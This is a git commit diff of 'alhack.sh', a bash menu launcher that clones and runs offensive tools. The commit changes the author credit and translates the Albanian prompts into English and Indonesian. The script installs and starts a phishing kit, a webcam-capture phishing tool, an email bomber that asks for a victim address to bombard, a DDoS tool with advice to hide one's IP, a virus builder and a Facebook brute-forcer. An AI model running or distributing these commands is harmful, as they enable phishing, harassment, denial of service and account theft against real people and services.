8d42909200c4779c7d215a7592e019bd18dd2a7f
kimzz41 <kimzzkece120@gmail.com>
2025-06-14 10:21:08 -0400

    Update alhack.sh

--- alhack.sh
+++ alhack.sh
@@ -8,19 +8,19 @@ echo -e '\033[31;40;1m
  ██╔══██║██║     ╚══════╝   ██║   ██║   ██║██║   ██║██║
  ██║  ██║███████╗           ██║   ╚██████╔╝╚██████╔╝███████╗
  ╚═╝  ╚═╝╚══════╝           ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝ v4
-  Coded by 4lbH4cker
-  github: https://github.com/4lbH4cker
-\033[33;4mVersion:\033[0m 4            \033[33;4mCTRL+C:\033[0m exit          \033[33;4mAuthor:\033[0m 4lbH4cker
+  Coded by Kimzzkece
+  github: https://github.com/Kimzz41
+\033[33;4mVersion:\033[0m 4            \033[33;4mCTRL+C:\033[0m exit          \033[33;4mAuthor:\033[0m Kimzzkece
 
-\e[37m[1]\e[36m Kërkesat & Përditësimi        \e[37m[2]\e[36m Phishing Tool				
-\e[37m[3]\e[36m WebCam Hack                   \e[37m[4]\e[36m Subscan			
-\e[37m[5]\e[36m Gmail Bomber		  \e[37m[6]\e[36m DDOS Attack			
-\e[37m[7]\e[36m Si të përdorni ?	          \e[37m[8]\e[36m Çinstaloni programet e shkarkuara		
-\e[37m[9]\e[36m Ip Info	                  \e[37m[10]\e[36m dorks-eye
-\e[37m[11]\e[36m HackerPro                    \e[37m[12]\e[36m RED_HAWK
-\e[37m[13]\e[36m VirusCrafter                 \e[37m[14]\e[36m Info-Site
-\e[37m[15]\e[36m BadMod	                  \e[37m[16]\e[36m Facebash
-\e[37m[17]\e[36m DARKARMY                     \e[37m[18]\e[36m AUTO-IP-CHANGER
+\e[37m[1]\e[36m Requests & Update               \e[37m[2]\e[36m Phishing Tool 
+\e[37m[3]\e[36m WebCam Hack                     \e[37m[4]\e[36m Subscan 
+\e[37m[5]\e[36m Gmail Bomber                    \e[37m[6]\e[36m DDOS Attack 
+\e[37m[7]\e[36m How to use ?                    \e[37m[8]\e[36m Uninstall the downloaded programs		
+\e[37m[9]\e[36m Ip Info 			\e[37m[10]\e[36m dorks-eye
+\e[37m[11]\e[36m HackerPro 			\e[37m[12]\e[36m RED_HAWK
+\e[37m[13]\e[36m VirusCrafter 			\e[37m[14]\e[36m Info-Site
+\e[37m[15]\e[36m BadMod 			\e[37m[16]\e[36m Facebash
+\e[37m[17]\e[36m DARKARMY 			\e[37m[18]\e[36m AUTO-IP-CHANGER
 
 '
 
@@ -28,11 +28,11 @@ echo -e '\033[31;40;1m
 #Zgjedhja e Opsionit
 
 
-read -p "Numri i transaksionit: " islem
+read -p "Nomor transaksi: " islem
 if [[ $islem == 1 || $islem == 01 ]]; then
 clear
 
-echo -e "\033[47;31;5m Po instalon përditësimin dhe kërkesat...\033[0m"
+echo -e "\033[47;31;5m Menginstal pembaruan dan persyaratan...\033[0m"
 sleep 5
 pkg install git -y
 pkg install python python3 -y
@@ -41,13 +41,13 @@ pkg install curl -y
 apt update
 apt upgrade -y
 clear
-echo -e "\033[47;3;35m Përditësimi i plotë...\033[0m"
+echo -e "\033[47;3;35m Pembaruan penuh...\033[0m"
 sleep 3
 bash alhack.sh
 
 elif [[ $islem == 2 || $islem == 02 ]]; then
 clear
-echo -e "\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m"
+echo -e "\033[47;3;35m Instalasi mungkin memakan waktu beberapa saat.\033[0m"
 sleep 3
 cd Tools
 git clone https://github.com/htr-tech/zphisher
@@ -56,7 +56,7 @@ bash zphisher.sh
 
 elif [[ $islem == 3 || $islem == 03 ]]; then
 clear
-echo -e "\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m"
+echo -e "\033[47;3;35m Instalasi mungkin memakan waktu beberapa saat.\033[0m"
 sleep 3
 cd Tools
 git clone https://github.com/techchipnet/CamPhish
@@ -65,16 +65,16 @@ bash camphish.sh
 
 elif [[ $islem == 4 || $islem == 04 ]]; then
 clear
-echo -e "\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m"
+echo -e "\033[47;3;35m Instalasi mungkin memakan waktu beberapa saat.\033[0m"
 sleep 3
 git clone https://github.com/zidansec/subscan
 cd subscan
-read -p "Jepni nje domain p.sh (example.com): " sc
+read -p "Masukkan domain, misalnya (example.com): " sc
 ./subscan $sc
        
 elif [[ $islem == 5 || $islem == 05 ]]; then
 clear
-echo -e "\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m"
+echo -e "\033[47;3;35m Instalasi mungkin memakan waktu beberapa saat.\033[0m"
 sleep 3
 cd Tools
 git clone https://github.com/juzeon/fast-mail-bomber.git
@@ -82,26 +82,26 @@ cd fast-mail-bomber/
 mv config.example.php config.php
 php index.php update-providers
 rm -rf data/nodes.json data/dead_providers.json
-echo -e "\033[47;3;35m Ky instalim do tju marre shum kohe\033[0m"
-echo -e "\033[47;3;35m Per te ndaluar shtypni Ctrl+C\033[0m"
+echo -e "\033[47;3;35m Instalasi ini akan memakan waktu lama.\033[0m"
+echo -e "\033[47;3;35m Untuk berhenti, tekan Ctrl+C.\033[0m"
 sleep 4
 php index.php update-nodes
 php index.php refine-nodes
 echo "-------------------------"
-read -p "Jepni nje adres emaili per te bombarduar: " mail
+read -p "Masukkan alamat email yang akan dibombardir.: " mail
 echo "-------------------------"
 php index.php start-bombing $mail
 
 elif [[ $islem == 6 || $islem == 06 ]]; then
 clear
-echo -e "\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m"
+echo -e "\033[47;3;35m Instalasi mungkin memakan waktu beberapa saat.\033[0m"
 sleep 3
 cd Tools
 git clone https://github.com/palahsu/DDoS-Ripper.git
 cd DDoS-Ripper
 python3 DRipper.py
 echo ""
-echo -e "\033[47;3;35m Para se ta perdorni fshihni ip-n tuaj\033[0m"
+echo -e "\033[47;3;35m Sebelum menggunakannya, sembunyikan IP Anda.j\033[0m"
 
 elif [[ $islem == 7 || $islem == 07 ]]; then
 clear
@@ -114,7 +114,7 @@ bash alhack.sh
  
 elif [[ $islem == 8 || $islem == 08 ]]; then
 clear
-echo -e "\033[47;3;35m PO HIQEN PROGRAMET E SHKARKUARA...\033[0m"
+echo -e "\033[47;3;35m PROGRAM YANG DIUNDUH SEDANG DIHAPUS...\033[0m"
 sleep 3 
 rm -rf Tools
 
@@ -122,7 +122,7 @@ bash alhack.sh
 
 elif [[ $islem == 9 || $islem == 09 ]]; then
 clear
-echo -e "\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m"
+echo -e "\033[47;3;35m Instalasi mungkin memakan waktu beberapa saat.\033[0m"
 sleep 3
 cd Tools
 apt update
@@ -133,7 +133,7 @@ bash trackip
 
 elif [[ $islem == 10 || $islem == 010 ]]; then
 clear
-echo -e "\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m"
+echo -e "\033[47;3;35m Instalasi mungkin memakan waktu beberapa saat.\033[0m"
 sleep 3
 cd Tools
 git clone https://github.com/BullsEye0/dorks-eye.git
@@ -143,7 +143,7 @@ python3 dorks-eye.py
 
 elif [[ $islem == 11 || $islem == 011 ]]; then
 clear
-echo -e "\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m"
+echo -e "\033[47;3;35m Instalasi mungkin memakan waktu beberapa saat.\033[0m"
 sleep 3
 cd Tools
 apt update && apt upgrade && apt install git && apt install python2
@@ -154,7 +154,7 @@ python2 hackerpro.py
 
 elif [[ $islem == 12 || $islem == 012 ]]; then
 clear
-echo -e "\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m"
+echo -e "\033[47;3;35m Instalasi mungkin memakan waktu beberapa saat.\033[0m"
 sleep 3
 cd Tools
 git clone https://github.com/Tuhinshubhra/RED_HAWK
@@ -163,7 +163,7 @@ php rhawk.php
 
 elif [[ $islem == 13 || $islem == 013 ]]; then
 clear
-echo -e "\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m"
+echo -e "\033[47;3;35m Instalasi mungkin memakan waktu beberapa saat.\033[0m"
 sleep 3
 cd Tools
 git clone https://github.com/Devil-Tigers/TigerVirus
@@ -175,7 +175,7 @@ bash app.sh
 
 elif [[ $islem == 14 || $islem == 014 ]]; then
 clear
-echo -e "\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m"
+echo -e "\033[47;3;35m Instalasi mungkin memakan waktu beberapa saat.\033[0m"
 sleep 3
 cd Tools
 pkg install curl -y
@@ -187,7 +187,7 @@ bash info.sh
 
 elif [[ $islem == 15 || $islem == 015 ]]; then
 clear
-echo -e "\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m"
+echo -e "\033[47;3;35m Instalasi mungkin memakan waktu beberapa saat.033[0m"
 sleep 3
 cd Tools
 sudo apt-get update
@@ -201,7 +201,7 @@ sudo php BadMod.php
 
 elif [[ $islem == 16 || $islem == 016 ]]; then
 clear
-echo -e "\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m"
+echo -e "\033[47;3;35m Instalasi mungkin memakan waktu beberapa saat.\033[0m"
 sleep 3
 cd Tools
 git clone https://github.com/fu8uk1/facebash
@@ -213,7 +213,7 @@ sudo ./facebash.sh
 
 elif [[ $islem == 17 || $islem == 017 ]]; then
 clear
-echo -e "\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m"
+echo -e "\033[47;3;35m Instalasi mungkin memerlukan waktu beberapa saat\033[0m"
 sleep 3
 cd Tools
 pkg install git
@@ -227,22 +227,22 @@ python2 darkarmy.py
 
 elif [[ $islem == 18 || $islem == 018 ]]; then
 clear
-echo -e "\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m"
-echo -e "\033[47;3;35m Ky tool do tju kerkoje te jeni (ROOT)\033[0m"
+echo -e "\033[47;3;35m Instalasi mungkin memakan waktu beberapa saat.\033[0m"
+echo -e "\033[47;3;35m Alat ini akan mengharuskan Anda untuk (ROOT)\033[0m"
 sleep 3
 cd Tools
 sudo apt-get install tor
 pip3 install requests
 git clone https://github.com/FDX100/Auto_Tor_IP_changer.git
 cd Auto_Tor_IP_changer
-echo -e "\033[47;3;35m shkoni te shfletuesi juaj / ndryshoni përfaqësuesin (sock proxy) në 127.0.0.1:9050\033[0m"
+echo -e "\033[47;3;35m buka browser Anda / ubah proxy (sock proxy) në 127.0.0.1:9050\033[0m"
 sleep 8
 python3 install.py
 aut
 
 else   
 	clear
-        echo -e '\033[36;40;1m Keni futur kodin e gabuar'	
+        echo -e '\033[36;40;1m Anda memasukkan kode yang salah.'	
 	sleep 1
 	clear 
 	bash alhack.sh
